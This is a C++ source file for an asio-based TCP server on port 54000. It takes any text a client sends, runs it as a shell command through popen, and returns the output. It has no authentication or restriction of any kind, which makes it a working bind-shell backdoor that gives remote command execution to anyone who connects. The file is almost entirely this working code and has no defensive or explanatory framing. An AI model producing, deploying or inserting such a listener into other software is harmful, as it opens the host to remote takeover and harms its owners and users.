#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <asio.hpp>
#include <array>
#include <memory>
#include <cstdio>

#ifdef _WIN32
#define popen _popen
#define pclose _pclose
#endif

// See <repo>/readme.md
using asio::ip::tcp;

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");
    while (!feof(pipe.get())) {
        if (fgets(buffer.data(), 128, pipe.get()) != nullptr)
            result += buffer.data();
    }
    return result;
}

void handle_client(tcp::socket socket) {
    try {
        std::vector<char> buffer(1024);
        asio::error_code error;

        while (true) {
            size_t length = socket.read_some(asio::buffer(buffer), error);

            if (error == asio::error::eof) {
                std::cout << "Connection closed by client" << std::endl;
                break;
            }
            else if (error) {
                throw asio::system_error(error);
            }

            std::string command(buffer.data(), length);
            std::cout << "Received command: " << command << std::endl;

            // Execute the command and capture the output
            std::string result = exec(command.c_str());

            // Send the output back to the client
            result += "\0";
            asio::write(socket, asio::buffer(result), error);
        }
    }
    catch (std::exception& e) {
        std::cerr << "Exception in thread: " << e.what() << std::endl;
    }
}

int main() {
    try {
        asio::io_context io_context;
        tcp::acceptor acceptor(io_context, tcp::endpoint(tcp::v4(), 54000));

        std::cout << "Server is listening on port 54000..." << std::endl;

        while (true) {
            tcp::socket socket(io_context);
            acceptor.accept(socket);
            std::thread(handle_client, std::move(socket)).detach();
        }
    }
    catch (std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
    }

    return 0;
}
